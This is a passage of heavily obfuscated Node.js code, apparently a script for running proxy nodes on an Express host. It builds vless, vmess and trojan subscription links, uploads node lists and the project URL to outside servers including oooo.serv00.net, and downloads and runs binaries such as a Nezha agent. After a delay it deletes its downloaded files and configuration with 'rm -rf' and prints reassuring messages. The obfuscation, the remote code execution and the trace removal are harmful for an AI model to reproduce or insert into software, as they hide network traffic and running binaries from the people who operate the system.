_0x298095[_0x193b12(0x199)][_0x193b12(0x104)]+'_'+_0x298095[_0x193b12(_0x226474._0x619010)][_0x193b12(0x17a)];}catch(_0x5dc646){try{const _0x5c7ca8=await axios[_0x193b12(0x155)](_0x193b12(_0x226474._0x11b548),{'timeout':0xbb8});if(_0x5c7ca8[_0x193b12(0x199)]&&_0x5c7ca8[_0x193b12(0x199)][_0x193b12(_0x226474._0x723707)]===_0x193b12(_0x226474._0x3d9f1e)&&_0x5c7ca8[_0x193b12(_0x226474._0x619010)][_0x193b12(_0x226474._0xf404f4)]&&_0x5c7ca8['data'][_0x193b12(0x17a)])return _0x5c7ca8[_0x193b12(_0x226474._0x619010)][_0x193b12(_0x226474._0xf404f4)]+'_'+_0x5c7ca8[_0x193b12(_0x226474._0x5432be)][_0x193b12(_0x226474._0x382e21)];}catch(_0x536cc1){}}return'Unknown';}async function _0x5e6d88(_0x69adf6){const _0x473f23=await _0x2e9b88(),_0x17b711=NAME?NAME+'-'+_0x473f23:_0x473f23;return new Promise(_0x3ffbf0=>{const _0x518cd7={_0x2c8d3b:0xd1,_0x211098:0x117,_0x38ca16:0xed,_0x2a6449:0x17d,_0xe318ae:0xd4,_0x2c9189:0x185,_0x203aa3:0xd8,_0x529e9b:0xcd,_0x396964:0x155};setTimeout(()=>{const _0x2b1ed={_0x38def0:0xd8,_0x2665a6:0x197,_0x485819:0xfc},_0x45f226=_0x2040,_0x358a28={'v':'2','ps':''+_0x17b711,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x45f226(0x140),'net':'ws','type':'none','host':_0x69adf6,'path':_0x45f226(0x17b),'tls':_0x45f226(0xfe),'sni':_0x69adf6,'alpn':'','fp':_0x45f226(_0x518cd7._0x2c8d3b)},_0x649b9e=_0x45f226(0x196)+UUID+'@'+CFIP+':'+CFPORT+_0x45f226(_0x518cd7._0x211098)+_0x69adf6+_0x45f226(_0x518cd7._0x38ca16)+_0x69adf6+_0x45f226(0x181)+_0x17b711+'\x0a\x0avmess://'+Buffer[_0x45f226(0xd8)](JSON['stringify'](_0x358a28))['toString'](_0x45f226(_0x518cd7._0x2a6449))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x69adf6+_0x45f226(_0x518cd7._0x38ca16)+_0x69adf6+_0x45f226(0xff)+_0x17b711+_0x45f226(0x145);console[_0x45f226(_0x518cd7._0xe318ae)](Buffer[_0x45f226(0xd8)](_0x649b9e)[_0x45f226(_0x518cd7._0x2c9189)](_0x45f226(_0x518cd7._0x2a6449))),fs[_0x45f226(0x16d)](subPath,Buffer[_0x45f226(_0x518cd7._0x203aa3)](_0x649b9e)[_0x45f226(_0x518cd7._0x2c9189)]('base64')),console['log'](FILE_PATH+_0x45f226(_0x518cd7._0x529e9b)),uploadNodes(),app[_0x45f226(_0x518cd7._0x396964)]('/'+SUB_PATH,(_0x24de69,_0x1b32a3)=>{const _0x17ecf1=_0x45f226,_0x2d64b9=Buffer[_0x17ecf1(_0x2b1ed._0x38def0)](_0x649b9e)['toString'](_0x17ecf1(0x17d));_0x1b32a3[_0x17ecf1(_0x2b1ed._0x2665a6)](_0x17ecf1(_0x2b1ed._0x485819),_0x17ecf1(0x12d)),_0x1b32a3['send'](_0x2d64b9);}),_0x3ffbf0(_0x649b9e);},0x7d0);});}}async function uploadNodes(){const _0xfed0ff={_0x38ef80:0x118,_0x2668d8:0x12c,_0x5cf9b9:0xd4,_0x3901e6:0x154,_0x97bb46:0x113,_0x32c28c:0xf7,_0x135a20:0xd2,_0x4d9a6c:0x18c,_0x370599:0x16c,_0x112cbf:0x133,_0xa1033c:0x12c,_0xd8b8ab:0x193},_0x1b67fe=_0x301882;if(UPLOAD_URL&&PROJECT_URL){const _0x304f00=PROJECT_URL+'/'+SUB_PATH,_0x47c93c={'subscription':[_0x304f00]};try{const _0x4d8830=await axios[_0x1b67fe(0x16c)](UPLOAD_URL+_0x1b67fe(_0xfed0ff._0x38ef80),_0x47c93c,{'headers':{'Content-Type':_0x1b67fe(_0xfed0ff._0x2668d8)}});return _0x4d8830&&_0x4d8830[_0x1b67fe(0x193)]===0xc8?(console[_0x1b67fe(_0xfed0ff._0x5cf9b9)](_0x1b67fe(_0xfed0ff._0x3901e6)),_0x4d8830):null;}catch(_0x4cc232){if(_0x4cc232['response']){if(_0x4cc232[_0x1b67fe(_0xfed0ff._0x97bb46)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1b67fe(_0xfed0ff._0x32c28c)](listPath))return;const _0x314bb5=fs[_0x1b67fe(0x164)](listPath,_0x1b67fe(_0xfed0ff._0x135a20)),_0x299168=_0x314bb5[_0x1b67fe(0x192)]('\x0a')[_0x1b67fe(0x12b)](_0x2aafa5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2aafa5));if(_0x299168[_0x1b67fe(_0xfed0ff._0x4d9a6c)]===0x0)return;const _0x3ce1e7=JSON[_0x1b67fe(0xe0)]({'nodes':_0x299168});try{const _0x7239a6=await axios[_0x1b67fe(_0xfed0ff._0x370599)](UPLOAD_URL+_0x1b67fe(_0xfed0ff._0x112cbf),_0x3ce1e7,{'headers':{'Content-Type':_0x1b67fe(_0xfed0ff._0xa1033c)}});return _0x7239a6&&_0x7239a6[_0x1b67fe(_0xfed0ff._0xd8b8ab)]===0xc8?(console[_0x1b67fe(0xd4)](_0x1b67fe(0x103)),_0x7239a6):null;}catch(_0x4ce24f){return null;}}else return;}}function cleanFiles(){const _0x4e5973={_0x200867:0x112,_0x54250f:0x16f,_0x3cc174:0x141,_0x6d9456:0x16b,_0x4e9e58:0x171},_0x4de001={_0x2e6ded:0x10a};setTimeout(()=>{const _0x7aa0ee={_0xeeca32:0x10e,_0x2b6419:0xd4},_0x584385=_0x2040,_0x4e07d9=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4e07d9['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4e07d9[_0x584385(0xfa)](phpPath);process[_0x584385(0x146)]===_0x584385(_0x4e5973._0x200867)?exec(_0x584385(_0x4e5973._0x54250f)+_0x4e07d9['join']('\x20')+_0x584385(_0x4e5973._0x3cc174),_0x14deaf=>{const _0x51db2e=_0x584385;console[_0x51db2e(0x10a)](),console['log'](_0x51db2e(_0x7aa0ee._0xeeca32)),console[_0x51db2e(_0x7aa0ee._0x2b6419)](_0x51db2e(0x15a));}):exec('rm\x20-rf\x20'+_0x4e07d9[_0x584385(_0x4e5973._0x6d9456)]('\x20')+_0x584385(_0x4e5973._0x4e9e58),_0x43c506=>{const _0x5d4ba0=_0x584385;console[_0x5d4ba0(_0x4de001._0x2e6ded)](),console['log']('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1414ec={_0x467673:0x150,_0x578e5c:0x16c,_0x2be55a:0x152,_0x3d67cb:0x15d},_0x4dd63e=_0x301882;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x4dd63e(_0x1414ec._0x467673));return;}try{const _0x427de1=await axios[_0x4dd63e(_0x1414ec._0x578e5c)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x4dd63e(0xd4)](_0x4dd63e(0x13e)),_0x427de1;}catch(_0x2926bd){return console[_0x4dd63e(0xda)](_0x4dd63e(_0x1414ec._0x2be55a)+_0x2926bd[_0x4dd63e(_0x1414ec._0x3d67cb)]),null;}}async function startserver(){const _0x5ecc74={_0x3b8523:0x18a},_0x29fa0d=_0x301882;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x40c312){console['error'](_0x29fa0d(_0x5ecc74._0x3b8523),_0x40c312);}}startserver()[_0x301882(0x11a)](_0x18fa01=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x18fa01);}),app[_0x301882(0x155)]('/',async function(_0x5327fe,_0x5b6242){const _0x5bce48={_0x54c287:0x16b,_0x13cd93:0xee,_0x1879e8:0x127},_0x5dac18=_0x301882;try{const _0x45e7a1=path[_0x5dac18(_0x5bce48._0x54c287)](__dirname,_0x5dac18(_0x5bce48._0x13cd93)),_0x2c7ad7=await fs[_0x5dac18(0x14c)][_0x5dac18(0x108)](_0x45e7a1,'utf8');_0x5b6242[_0x5dac18(0x127)](_0x2c7ad7);}catch(_0x4b59cd){_0x5b6242[_0x5dac18(_0x5bce48._0x1879e8)](_0x5dac18(0x14d));}}),app[_0x301882(0xe1)](PORT,()=>console[_0x301882(0xd4)](_0x301882(0x12e)+PORT+'!'));
